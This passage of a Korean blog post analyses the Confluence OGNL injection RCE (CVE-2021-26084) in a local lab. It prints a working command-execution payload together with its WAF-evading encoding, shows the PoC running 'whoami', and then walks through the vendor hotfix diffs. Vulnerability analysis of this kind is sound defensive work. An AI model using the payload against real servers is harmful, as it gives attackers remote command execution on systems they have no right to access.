<p>세팅은 다 된것 같으니, 한번 PoC 코드를 실행시켜 봅시다. 명령 실행이 잘 되는 것을 확인할 수 있습니다.</p>
<pre tabindex=0><code>$ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p /pages/createpage-entervariables.action?SpaceKey=x
--------------------------------------------------------------
[-] Confluence Server Webwork OGNL injection
[-] CVE-2021-26084
[-] https://github.com/h3v0x
---------------------------------------------------------------

&gt; whoami
aaaaaaaa[confluence
]
&gt;

</code></pre><h2 id=poc-코드-분석>PoC 코드 분석<a hidden class=anchor aria-hidden=true href=#poc-코드-분석>#</a></h2>
<p><a href=https://raw.githubusercontent.com/h3v0x/CVE-2021-26084_Confluence/main/Confluence_OGNLInjection.py>PoC 코드</a>는 매우 단순합니다. 우리가 입력한 URL에 실행할 명령어를 queryString 파라미터로 포함한 요청을 보내고 -> 응답값 내의 명령 실행 결과를 파싱하여 우리에게 보여줍니다. 웹서버 권한으로 모든 명령 실행이 가능합니다.</p>
<p>명령 실행을 위해 서버측에 보낸 코드는 아래와 같습니다.</p>
<pre tabindex=0><code>xpl_data = {&quot;queryString&quot;: &quot;aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022&quot;+cmd+&quot;\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027&quot;}
</code></pre><p>해당 코드를 조각내어 분석해 봅시다. 첫번째 코드 조각은, 명령 실행 시 서버 환경 확인 및 윈도우의 경우 cmd.exe, 그 외의 경우 bash 를 활용하여 명령 실행 할 수 있도록 서버의 실행 환경을 확인하는 코드입니다.</p>
<p>추가적으로, 코드 작성 시 자바 코드를 자바스크립트 문법으로 사용할 수 있도록 도와주는 ScriptEngineManager를 활용 하였습니다. 컨플루언스에 적용되어있는 시큐어 코딩 방식은 특정 프로퍼티, 메소드 등을 블랙리스트로 탐지하는 방식이여서 new String[]을 입력할 수 없습니다. 그러므로 명령 실행을 위한 명령어를 변수로 설정하는 것이 불가능하고, 따라서 명령 실행이 불가능 합니다. 이러한 제약사항을 ScriptEngineManager를 활용하여 우회합니다.</p>
<blockquote>
<p>:exclamation: 원본 코드에는 <code>.eval</code> 부분이 <code>.\\u0065val</code> 식으로 인코딩 되어 있어 (1) 인코딩 상태와 (2) 인코딩 되지 않은 상태 두가지 다 테스트 해 본 결과, 인코딩이 되어 있어도 정상적으로 <code>.eval</code> 형태로 인식하는 것을 확인 했습니다.</p>
</blockquote>
<blockquote>
<p><code>.eval</code>로 작성해도 정상적으로 인식 함에도 불구하고 왜 이런 방식으로 작성해 두었는지 궁금했는데, 관련된 흥미로운 글을 발견했습니다.</p>
</blockquote>
<blockquote>
<p>요약) VMWare에 취약점 제보를 위해 제공했던 익스플로잇 코드가 github 내 공개 레포지토리인 Nuclei template 의 <a href=https://github.com/projectdiscovery/nuclei-templates/pull/2529/commits/f1f5add7971078c239c9862c361f834fa9bdbb61>pull request</a>에 등록 되어 공격 페이로드가 외부 공개 되었다는 주장입니다.</p>
</blockquote>
<blockquote>
<p>상세) VMWare에 접수한 익스플로잇 코드는 VMWare 사에 적용되어있는 WAF를 우회하기 위하여 <code>eval</code>이 아닌 <code>\\u0065val</code>로 설정해 두었고, 명령 실행 결과를 구분하기 위하여 <code>aaaaaaaaa[실행결과]</code> 형태로 결과물을 출력해 주는것이 특징입니다. 해당 pull request 내에 사용된 공격 payload는 익스플로잇 코드 유출을 주장하는 사용자가 VMWare에 접수한 코드와 동일합니다. 또한 이 게시물에서 다루는 <a href=https://raw.githubusercontent.com/h3v0x/CVE-2021-26084_Confluence/main/Confluence_OGNLInjection.py>PoC 코드</a>와도 동일합니다. 해당 글 작성자는 2021년 8월 31일 오전 10:39 (UTC+7)에 VMWare에 티켓을 접수하였고, 위의 pull request는 2021년 9월 1일 오전 3:44(UTC+7)에 올라왔습니다.</p>
</blockquote>
<blockquote>
<p>원문) <a href=https://tradahacking.vn/atlassian-confluence-cve-2021-26084-the-other-side-of-bug-bounty-45ed19c814f6>[Atlassian Confluence CVE-2021–26084]::: The other side of bug report!</a></p>
</blockquote>
<pre tabindex=0><code>Class.forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\'var isWin = java.lang.System.getProperty(\&quot;os.name\&quot;).toLowerCase().contains(\&quot;win\&quot;);

var cmd = new java.lang.String(\&quot;&quot;+cmd+&quot;\&quot;);
var p = new java.lang.ProcessBuilder();

if(isWin){p.command(\&quot;cmd.exe\&quot;, \&quot;/c\&quot;, cmd); }
else{p.command(\&quot;bash\&quot;, \&quot;-c\&quot;, cmd); }
p.redirectErrorStream(true);
</code></pre><p>명령 실행을 위한 세팅이 끝나면, 실제 환경에 맞는 실행 명령 전달을 통해 명령 실행 및 결과를 출력 합니다.</p>
<pre tabindex=0><code>var process= p.start();
var inputStreamReader = new java.io.InputStreamReader(process.getInputStream());
var bufferedReader = new java.io.BufferedReader(inputStreamReader);
var line = \&quot;\&quot;;
var output = \&quot;\&quot;;
while((line = bufferedReader.readLine()) != null){
  output = output + line + java.lang.Character.toString(10);
}\')}+\'
</code></pre><h2 id=실제-패치-내용-분석>실제 패치 내용 분석<a hidden class=anchor aria-hidden=true href=#실제-패치-내용-분석>#</a></h2>
<p>아틀라시안에서는 해당 취약점 패치를 위한 <a href=https://confluence.atlassian.com/doc/files/1077906215/1077916296/2/1629936383093/cve-2021-26084-update.sh>핫픽스</a>를 공개 하였습니다. 패치를 적용한 후 패치 내용을 분석해 봅니다. 중요한 내용 위주로 보겠습니다.</p>
<p>File 1(confluence/users/user-dark-features.vm)과 File 2(confluence/login.vm)에는 변동사항이 없습니다.</p>
<pre tabindex=0><code>File 1: 'confluence/users/user-dark-features.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
   d. validating file changes.. ok
   e. file updated successfully!

File 2: 'confluence/login.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
   d. validating file changes.. ok
   e. file updated successfully!
</code></pre><p>File 3의 경우는 일부 변경사항이 있습니다. 기존의 <code>$!queryString</code> 에서 <code>queryString</code>으로 변경됐습니다. <code>linkCreation</code>도 마찬가지로 <code>$</code>가 빠졌습니다. Velocity의 지시자 파라미터로 처리되지 않도록 변경된 것입니다. Velocity의 지시자 파라미터는 <code>=</code> 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생하는 취약점으로 보입니다.</p>
<pre tabindex=0><code>File 3: 'confluence/pages/createpage-entervariables.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
24c24
&lt;                 #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value='$!queryString'&quot;)
---
&gt;                 #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value=queryString&quot;)
26c26
&lt;                 #tag (&quot;Hidden&quot; &quot;name='linkCreation'&quot; &quot;value='$linkCreation'&quot;)
---
&gt;                 #tag (&quot;Hidden&quot; &quot;name='linkCreation'&quot; &quot;value=linkCreation&quot;)
   d. validating file changes..ok
   e. file updated successfully!
</code></pre><p>File 4(content-editor.vm)와 5(confluence-editor-loader*.jar)도 마찬가지로 입력값이 변수 처리 되지 않도록 패치 되었습니다.</p>
<pre tabindex=0><code>File 4: 'confluence/template/custom/content-editor.vm':
   a. backing up file.. done
   b. updating file.. done
   c. showing file changes..
64c64
&lt;         #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value='$!queryString'&quot;)
---
&gt;         #tag (&quot;Hidden&quot; &quot;name='queryString'&quot; &quot;value=queryString&quot;)
85c85
&lt;             #tag (&quot;Hidden&quot; &quot;id=sourceTemplateId&quot; &quot;name='sourceTemplateId'&quot; &quot;value='${templateId}'&quot;)
---
&gt;             #tag (&quot;Hidden&quot; &quot;id=sourceTemplateId&quot; &quot;name='sourceTemplateId'&quot; &quot;value=templateId&quot;)
   d. file updated successfully!

File 5: 'confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader*.jar':
   a. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar..
Archive:  confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar
  inflating: ./templates/editor-preload-container.vm
   b. updating file.. done
   c. showing file changes..
56c56
&lt; #tag (&quot;Hidden&quot; &quot;id=syncRev&quot; &quot;name='syncRev'&quot; &quot;value='$!{action.syncRev}'&quot;)
---
&gt; #tag (&quot;Hidden&quot; &quot;id=syncRev&quot; &quot;name='syncRev'&quot; &quot;value=syncRev&quot;)
   d. validating file changes.. ok
   e. updating confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar with ./templates/editor-preload-container.vm..updating: templates/editor-preload-container.vm (deflated 59%)
-rw-r--r--  1 ...  ....  13370 Sep  9 23:52 confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar
   f. cleaning up temp files..ok
   g. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar again to check changes within JAR..
...skipping...
</code></pre><p>완료 후 PoC를 재실행 해 보면 아래와 같이 명령어가 해석되지 않고 그대로 출력되는 것을 확인할 수 있습니다.</p>
<pre tabindex=0><code>❯ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p &quot;/pages/createpage-entervariables.action?SpaceKey=deguru&quot;
---------------------------------------------------------------
[-] Confluence Server Webwork OGNL injection
[-] CVE-2021-26084
[-] https://github.com/h3v0x
---------------------------------------------------------------

&gt; whoami
aaaaaaaa\u0027+{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var isWin = java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022); var cmd = new java.lang.String(\u0022whoami\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\u0022cmd.exe\u0022, \u0022/c\u0022, cmd); } else{p.command(\u0022bash\u0022, \u0022-c\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \u0022\u0022; var output = \u0022\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\u0027)}+\u0027
</code></pre><h2 id=결론>결론<a hidden class=anchor aria-hidden=true href=#결론>#</a></h2>
<ul>
<li>컨플루언스를 쓴다면, 최신버전으로 업데이트 하거나 핫픽스가 반드시 필요합니다.</li>
</ul>
<h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2>
<ul>
<li><a href=https://github.com/h3v0x/CVE-2021-26084_Confluence>https://github.com/h3v0x/CVE-2021-26084_Confluence</a></li>
<li><a href=https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md>https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md</a></li>
<li><a href=https://velocity.apache.org/engine/2.3/vtl-reference.html#variables>https://velocity.apache.org/engine/2.3/vtl-reference.html#variables</a></li>
<li><a href=https://twitter.com/pwntester/status/1433888277946372109>https://twitter.com/pwntester/status/1433888277946372109</a></li>
</ul>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://deguru22.github.io/posts/arm-assembly-4/>
<span class=title>« Prev Page</span>
<br>
<span>ARM 어셈블리 튜토리얼 (4) 메모리 명령어: 불러오기 및 저장</span>
</a>
<a class=next href=https://deguru22.github.io/posts/arm-assembly-3/>
<span class=title>Next Page »</span>
<br>
<span>ARM 어셈블리 튜토리얼 (3) ARM & Thumb</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share 컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) on twitter" href="https://twitter.com/intent/tweet/?text=%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4%20OGNL%20Injection%20%28RCE%29%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%28CVE-2021-26084%29&url=https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share 컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f&title=%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4%20OGNL%20Injection%20%28RCE%29%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%28CVE-2021-26084%29&summary=%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4%20OGNL%20Injection%20%28RCE%29%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%28CVE-2021-26084%29&source=https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share 컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f&title=%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4%20OGNL%20Injection%20%28RCE%29%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%28CVE-2021-26084%29"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share 컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share 컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) on whatsapp" href="https://api.whatsapp.com/send?text=%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4%20OGNL%20Injection%20%28RCE%29%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%28CVE-2021-26084%29%20-%20https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share 컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) on telegram" href="https://telegram.me/share/url?text=%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4%20OGNL%20Injection%20%28RCE%29%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%28CVE-2021-26084%29&url=https%3a%2f%2fdeguru22.github.io%2fposts%2fcve-2021-26084_confluence-ognl-rce%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>&copy; 2021 <a href=https://deguru22.github.io/>데구루루x2 놀이터</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
</body>
</html>